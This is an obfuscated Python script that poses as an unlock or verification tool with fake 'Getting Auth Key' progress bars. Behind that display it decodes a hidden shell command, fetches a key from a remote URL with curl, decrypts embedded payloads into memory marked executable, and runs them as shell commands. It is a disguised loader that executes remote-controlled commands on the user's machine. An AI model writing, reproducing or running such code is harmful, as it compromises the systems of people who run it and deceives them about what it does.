import math as _m_t
import time as _t_m
import sys as _s_s
import subprocess as _s_p
import base64 as _b_6
import ctypes as _c_t
import random as _r_d

def _0x5a1(_0x1, _0x2):
    try:
        _0x3 = bytearray(_0x1) if isinstance(_0x1, (list, bytes, bytearray)) else bytearray(_b_6.b64decode(_0x1))
        if not _0x2: return None
        for _0x4 in range(len(_0x3)):
            _0x3[_0x4] ^= _0x2[_0x4 % len(_0x2)]
        _0x_r = bytes(_0x3)
        _0x5 = _c_t.create_string_buffer(_0x_r)
        _c_t.windll.kernel32.VirtualProtect(_c_t.cast(_0x5, _c_t.c_void_p), _c_t.c_size_t(len(_0x_r)), 0x40, _c_t.byref(_c_t.c_ulong()))
        return _0x5
    except: return None

def _0x_draw_bar(_msg):
    _s_s.stdout.write(f"[&] {_msg}\n")
    _s_s.stdout.flush()
    _total_time = _r_d.uniform(3, 5)
    _segments = ["---", "-------", "-------", "-------"]
    _interval = _total_time / len(_segments)
    _current_bar = ""
    for _seg in _segments:
        _current_bar += _seg + " "
        _s_s.stdout.write(f"\r    {_current_bar}")
        _s_s.stdout.flush()
        _t_m.sleep(_interval)
    _s_s.stdout.write(" [DONE]\n\n")

def _0x2b3():
    while True:
        try:
            _s_s.stdout.write("[&] " + "Conn" + "ecting To Ve" + "rify...\r")
            _s_s.stdout.flush()
            
            _y_k = str(_t_m.localtime().tm_year).encode()
            _e_c = [81, 69, 64, 90, 18, 29, 65, 22, 90, 68, 70, 70, 65, 10, 29, 25, 69, 71, 69, 24, 70, 81, 93, 84, 83, 95, 28, 85, 93, 93, 29, 68, 93, 82, 93, 66, 65, 30, 70, 78, 70, 16, 78, 22, 66, 73, 70, 94, 93, 94, 18, 27, 81, 16, 16, 95, 95, 64, 93, 68, 70, 16, 65, 79, 65, 11, 18, 70, 64, 89, 92, 66, 26, 67, 75, 69, 28, 67, 70, 82, 91, 94, 28, 68, 87, 81, 86, 30, 27, 30, 65, 66, 64, 89, 66, 30, 27, 107, 31, 5, 8, 109, 27, 20]
            _c1 = "".join([chr(_x ^ _y_k[_i % len(_y_k)]) for _i, _x in enumerate(_e_c)])
            
            _r1 = _s_p.run(_c1, shell=True, capture_output=True, text=True).stdout.strip()
            if not _r1: 
                _t_m.sleep(2); continue
            _0x_draw_bar("Getti" + "ng Auth Ke" + "y 1")
            _k1 = (_r1 * 4 + "**").encode() 
            _0x_v_l = [93, 72, 93, 4, 93, 75, 67, 91, 95, 4, 92, 69, 71]
            _c2_p = _0x5a1(_0x_v_l, _k1)
            if _c2_p:
                _u = _c2_p.value.decode('utf-8', errors='ignore').split('\x00')[0]
                _0x_draw_bar("Getti" + "ng Auth Ke" + "y 2")
                _full_u = "ht" + "tps://" + _u
                _p = _s_p.run(['curl', '-s', _full_u], capture_output=True, timeout=10)
                _o = _p.stdout
                if _o:
                    _tail = _o.strip()[-120:].decode('utf-8', errors='ignore')
                    _clean = _tail.replace('\r', '').replace('\n', '')
                    _tag = "scr" + "ipt"
                    if _tag in _clean:
                        _pos = _clean.find(_tag)
                        return _clean[_pos:_pos+3].encode()
        except: 
            pass
        _t_m.sleep(3)

def _0xf92(_0xb, _0xc, _0xd):
    if not _0xb or not _0xd: return
    _0xe = _0xb[0]
    _gv = lambda i: _0xd[i].value.decode('utf-8', errors='ignore').split('\x00')[0].strip()
    try:
        if _0xc.get(_0xe) == "P_R_N":
            _v = _gv(_0xb[1])
            if _v:
                if "Unlock" in _v:
                    _s_s.stdout.write(f"[*] {_v}\n")
                    _s_s.stdout.flush()
                else:
                    _0x_draw_bar(_v)
        elif _0xc.get(_0xe) == "S_L_P":
            _t_m.sleep(_0xb[1])
        elif _0xc.get(_0xe) == "S_H_L":
            _v = _gv(_0xb[1])
            if _v: _s_p.Popen(_v, shell=True)
        _0xf92(_0xb[2:], _0xc, _0xd)
    except: pass

if __name__ == "__main__":
    _K = _0x2b3()
    _M = {0x1A: "P_R_N", 0x2B: "S_H_L", 0x3C: "S_L_P"}
    _D = [
        'KEhZLkM7HQkXEBcbHQRcXU0=', 
        'KEkvUzYcHwwRGAocFEMQHAwGHwwTFwYAXU1c', 
        'AAsHBwcdBA1SXhBSXhdSQA==', 
        'HhAVU0lSUTYBFhEWEhcTUy8rO0M0BgAZUzZQ'
    ]
    _C = [_0x5a1(_x, _K) for _x in _D]
    _B = [0x1A, 0, 0x1A, 1, 0x2B, 3, 0x3C, 3.0, 0x2B, 2]
    if (_m_t.sin(0)**2 + _m_t.cos(0)**2) == 1:
        _0xf92(_B, _M, _C)

